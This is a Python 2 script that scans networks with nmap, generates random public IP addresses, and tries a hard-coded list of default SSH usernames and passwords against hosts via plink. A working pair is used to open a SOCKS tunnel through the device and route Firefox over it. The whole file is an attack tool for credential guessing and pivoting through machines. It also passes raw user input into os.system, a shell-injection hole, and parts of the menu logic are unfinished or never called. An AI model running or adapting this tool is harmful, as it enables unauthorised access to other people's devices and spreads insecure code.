# -*- coding: utf-8 -*-
import socket
import nmap
import random
import os
import paramiko
import re
import subprocess
import time
from selenium import webdriver
from sshtunnel import SSHTunnelForwarder
import sys
import io

default = [("ubuntu", ""), ("admins", "password"), ("admin", "PoopyMonkeys")]


def menu():
    return """1. Get IPs list.
2. Get information about a device.
3. Tunnel through device.
4. Exit.
(1/2/3/4)
"""


def get_list():
    nm = nmap.PortScanner()
    nm.scan()
    return nm.all_hosts()


def get_info():
    ip = raw_input("Insert ip: ")
    return os.system('nmap -O -Pn ' + ip)


def generate_ip():
    str_ip = "77."
    int_ip = random.randint(124, 127)
    str_ip += str(int_ip) + '.'
    int_ip = random.randint(0, 255)
    str_ip += str(int_ip) + '.'
    int_ip = random.randint(0, 255)
    str_ip += str(int_ip)
    print str_ip
    return str_ip


def init_tunnel():
    ssh = paramiko.SSHClient()
    pat = re.compile("Linux")
    ip = generate_ip()
    #ops = os.system('nmap -O -Pn ' + ip)
    #while re.search(pat, str(ops)) is not None:
     #   ip = generate_ip()
    #tunnel(ssh, 'ip')
    ssh.close()


def handle(ans, client):
    if ans == 1:
        print get_list()
    if ans == 2:
        print get_info()
    if ans == 3:
        init_tunnel()


def check(ans):
    return ans in [1, 2, 3]


def install_firefox_proxy(PROXY_HOST,PROXY_PORT):
    fp = webdriver.FirefoxProfile()
    fp.set_preference("network.proxy.type", 1)
    fp.set_preference("network.proxy.socks", PROXY_HOST)
    fp.set_preference("network.proxy.socks_port", int(PROXY_PORT))
    fp.set_preference("network.proxy.socks_remote_dns", True)
    fp.update_preferences()
    return webdriver.Firefox(firefox_profile=fp)


def find_name_and_password(ip):
    correct = ()
    for name, password in default:
        try:
            command = "plink -D 3200 -pw %s %s@%s" % (password, name, ip)  # the shell command

            filename = 'test.log'
            with io.open(filename, 'wb') as writer, io.open(filename, 'rb', 1) as reader:
                process = subprocess.Popen(command, stdout=writer,
                                       shell=True)
                time.sleep(10)
                process.kill()
                while process.poll() is None:
                    sys.stdout.write(reader.read())
                    time.sleep(0.5)
                # Read the remaining
                sys.stdout.write(reader.read())
            with open(filename, 'rb') as myfile:
                if "password" not in myfile.read():
                    correct = name, password

        except Exception as err:
            print "an error occured: " + str(err)
    return correct


def open_firefox():
    driver = install_firefox_proxy("127.0.0.1", 3200)
    driver.get('about:config')


def tunnel_putty_link(name, password, ip):
    try:
        subprocess.call("plink -D 3200 -pw %s %s@%s" % (password, name, ip))
    except Exception as error:
        print "An error occured: " + str(error)


def tunnel(ip):
    name, password = find_name_and_password(ip)
    open_firefox()
    tunnel_putty_link(name, password, ip)


def main():

    ip = "192.168.1.42"
    tunnel(ip)


if __name__ == '__main__':
    main()
